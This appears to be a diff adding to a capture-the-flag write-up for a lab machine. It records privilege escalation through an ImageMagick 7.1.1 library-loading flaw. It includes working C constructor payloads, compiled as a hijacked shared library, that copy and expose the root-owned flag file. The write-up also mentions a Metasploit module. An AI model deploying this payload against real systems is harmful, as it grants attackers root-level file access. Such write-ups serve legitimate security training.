@@ -70,3 +70,52 @@ developer@titanic:~$ cat user.txt
 developer@titanic:~$
 
 Now with SSH access to the machine, we'll need to find a way to privilege escalate to root.
+Upon looking at /opt/scripts I noticed the identify_images.sh file. I used nano to open it and found:
+
+truncate -s 0 metadata.log
+find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >>
+
+This tells me that the server is using magick identify when I asked chatgpt. 
+Searched metasploit for modules to exploit image magick.
+Found: exploit/unix/fileformat/imagemagick_delegate
+attempting to create reverse shell using this module but no success.
+
+Used /usr/bin/magick --version to identify the exact version which is:
+imagemagick 7.1.1
+This github page has an arbitrary code vulnerability for this version:
+https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8
+
+With the help of chatgpt, I was able to determine that this vulnerability means that because we're able to write to the images directory from before, we can upload a file or folder
+that will execute commands as sudo. I'm going to use this exploit to extract and change the permissions of the root flag which is likely root.txt on the root home.
+
+Navigated to:
+cd /opt/app/static/assets/images/
+created:
+nano exploit.c
+and put in:
+#include <stdio.h>
+#include <stdlib.h>
+
+static void exploit() __attribute__((constructor));
+
+void exploit() {
+    system("cp /root/root.txt /tmp/root.txt && chmod 777 /tmp/root.txt");
+}
+
+this then uploaded successfully into the images file. I compiled it with:
+gcc -shared -o libexploit.so -fPIC exploit.c
+then verified the file existed.
+This strategy didn't work, so I ran this directly in the shell:
+gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+__attribute__((constructor)) void init(){
+    system("cp /root/root.txt root.txt; chmod 754 root.txt");
+    exit(0);
+}
+EOF
+
+
+
